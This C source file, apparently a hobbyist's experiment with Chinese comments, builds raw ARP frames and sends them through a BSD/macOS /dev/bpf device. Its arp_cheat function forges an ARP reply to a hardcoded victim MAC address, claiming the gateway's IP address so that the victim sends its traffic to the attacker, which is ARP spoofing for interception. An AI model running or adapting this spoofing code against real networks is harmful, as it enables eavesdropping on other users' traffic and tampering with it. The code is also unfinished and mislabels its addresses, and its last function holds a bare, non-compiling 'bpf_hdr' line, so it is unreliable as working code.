#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <net/bpf.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>
#include <fcntl.h>
#include <net/ethernet.h>// for ether_header
#include <netinet/if_ether.h> // for ether_arp
#include <arpa/inet.h>
 

//TODO:
//发送请求包直接write了。那 
//如何接收请求包的应答包？或如何抓包？  


//const items
#define DEV_PLEN 12              //device path length, 设备路径长度。比如"/dev/bpf255"，最长11个字节加最后一位终止符，共12字节
const char INTERFACE[] = "en1";
const u_char TARGET_MAC[] = {0xd0,0x7e,0x35,0x0a,0xef,0xd3}; //victim's mac
const u_char SOURCE_MAC[] = {0x20,0xc9,0xd0,0xcb,0xf2,0xe7};//{0xbb,0xbb,0xbb,0xbb,0xbb,0xbb}; //attacker's mac
const u_char SOURCE_IP[] = {10,4,17,226};//{192,168,1,109};                    //victim's ip
const u_char TARGET_IP[] = {10,4,16,1};//{192,168,1,1};                    //gateway's ip, 这里也一样，因为我们要假装是网关，所以用网关的ip


const u_char BORADCAST_MAC[] = {0xff,0xff,0xff,0xff,0xff,0xff};

//main function
int main(int argc, char **argv) {
  
    send_arp_request();
    //arp_cheat();
}

//发送arp包。 知道对方ip地址，获取对方mac地址。
//发送的是mac地址的广播， 发送的请求包。
int send_arp_request()
{
    int bpf = -1;
    int devno = 0;
    char dev[DEV_PLEN];
    u_char frame[100];
    
    
    //create arp frame -- 与之前相同，创建一个42字节长的arp帧
    struct ether_header ehead;
    struct ether_arp earp;
    
    memcpy(ehead.ether_dhost, BORADCAST_MAC, ETHER_ADDR_LEN);
    memcpy(ehead.ether_shost, SOURCE_MAC, ETHER_ADDR_LEN);
    ehead.ether_type = htons(ETHERTYPE_ARP);
    
    earp.arp_hrd = htons(ARPHRD_ETHER);
    earp.arp_pro = htons(ETHERTYPE_IP);
    earp.arp_hln = ETHER_ADDR_LEN;
    earp.arp_pln = 4;
    earp.arp_op = htons(ARPOP_REQUEST);
    
    memcpy(earp.arp_sha, SOURCE_MAC, ETHER_ADDR_LEN);
    memcpy(earp.arp_spa, SOURCE_IP, 4);
    memcpy(earp.arp_tha, BORADCAST_MAC, ETHER_ADDR_LEN);
    memcpy(earp.arp_tpa, TARGET_IP, 4);
    
    memcpy(frame, &ehead, sizeof(ehead));
    memcpy(frame + sizeof(ehead), &earp, sizeof(earp));
    

    char hello[40] = "arphello";
    memcpy(frame + sizeof(ehead) + sizeof(earp), hello, strlen(hello));

    printf("* ARP frame created.\n");
    
    printf("%d\n",bpf);
    // find available bpf device -- 找到空闲的bpf设备
    while(bpf < 0) {
        snprintf(dev, DEV_PLEN, "/dev/bpf%d", devno);
        bpf = open(dev, O_RDWR);//O_WRONLY);
        
        ++devno;
        if(devno > 255) {
            printf("/dev/bpf* full.\n");
            exit(EXIT_FAILURE);
        }
    }
    printf("* /dev/bpf%d available.\n", --devno);
    
    
    // bound bpf to an interface -- 通过ioctl将bpf与网络接口进行绑定
    struct ifreq boundif;
    strncpy(boundif.ifr_name, INTERFACE, strlen(INTERFACE));
    if(ioctl(bpf, BIOCSETIF, &boundif) < 0) {
        perror("ioctl() failed");
        close(bpf);
        exit(EXIT_FAILURE);
    }
    
    
    printf("* Interface %s bound.\n", INTERFACE);
    
    //抓包发现checksum错误。 不过并不影响包。
    
    // write to bpf -- 直接写入bpf即可发送，因为arp帧的头部已经包含了目标地址信息
    if(write(bpf, frame, sizeof(frame)) < 0) {
        perror("write() failed");
        close(bpf);
        exit(EXIT_FAILURE);
    }
    printf("* Done write to bpf.\n");
    
    
   
    
    char resposeBuf[100];
    while (1) {
        if(read(bpf, resposeBuf, 100) > 0)
        {
            break;
        }
    }
    
    
    printf("%s",resposeBuf);
    
    close(bpf);
    
    return 0;
}

//专门指定目的mac地址，发送的应答包。
int arp_cheat()
{
    int bpf = -1;
    int devno = 0;
    char dev[DEV_PLEN];
    u_char frame[100]; //[42];
    
    
    //create arp frame -- 与之前相同，创建一个42字节长的arp帧
    struct ether_header ehead;
    struct ether_arp earp;
    
    memcpy(ehead.ether_dhost, TARGET_MAC, ETHER_ADDR_LEN);
    memcpy(ehead.ether_shost, SOURCE_MAC, ETHER_ADDR_LEN);
    ehead.ether_type = htons(ETHERTYPE_ARP);
    
    earp.arp_hrd = htons(ARPHRD_ETHER);
    earp.arp_pro = htons(ETHERTYPE_IP);
    earp.arp_hln = ETHER_ADDR_LEN;
    earp.arp_pln = 4;
    earp.arp_op = htons(ARPOP_REPLY); //发送的是ARP的应答包。欺骗受害者，让其误认为我是网关。 人家就以为192.168.1.1是我。
    memcpy(earp.arp_sha, SOURCE_MAC, ETHER_ADDR_LEN);
    memcpy(earp.arp_spa, SOURCE_IP, 4);
    memcpy(earp.arp_tha, TARGET_MAC, ETHER_ADDR_LEN);
    memcpy(earp.arp_tpa, TARGET_IP, 4);
    
    memcpy(frame, &ehead, sizeof(ehead));
    memcpy(frame + sizeof(ehead), &earp, sizeof(earp));
    //char hello[40] = "arpCheat";
    //memcpy(frame + sizeof(ehead) + sizeof(earp), hello, strlen(hello));

    printf("* ARP frame created.\n");
    
    printf("%d\n",bpf);
    // find available bpf device -- 找到空闲的bpf设备
    while(bpf < 0) {
        snprintf(dev, DEV_PLEN, "/dev/bpf%d", devno);
        bpf = open(dev, O_WRONLY);
        
        ++devno;
        if(devno > 255) {
            printf("/dev/bpf* full.\n");
            exit(EXIT_FAILURE);
        }
    }
    printf("* /dev/bpf%d available.\n", --devno);
    
    
    // bound bpf to an interface -- 通过ioctl将bpf与网络接口进行绑定
    struct ifreq boundif;
    strncpy(boundif.ifr_name, INTERFACE, strlen(INTERFACE));
    if(ioctl(bpf, BIOCSETIF, &boundif) < 0) {
        perror("ioctl() failed");
        close(bpf);
        exit(EXIT_FAILURE);
    }
    printf("* Interface %s bound.\n", INTERFACE);
    
    
    // write to bpf -- 直接写入bpf即可发送，因为arp帧的头部已经包含了目标地址信息
    if(write(bpf, frame, sizeof(frame)) < 0) {
        perror("write() failed");
        close(bpf);
        exit(EXIT_FAILURE);
    }
    printf("* Done write to bpf.\n");
    
    close(bpf);
    return 0;
}

int recv_arp_response()
{
    bpf_hdr
    return 0;
}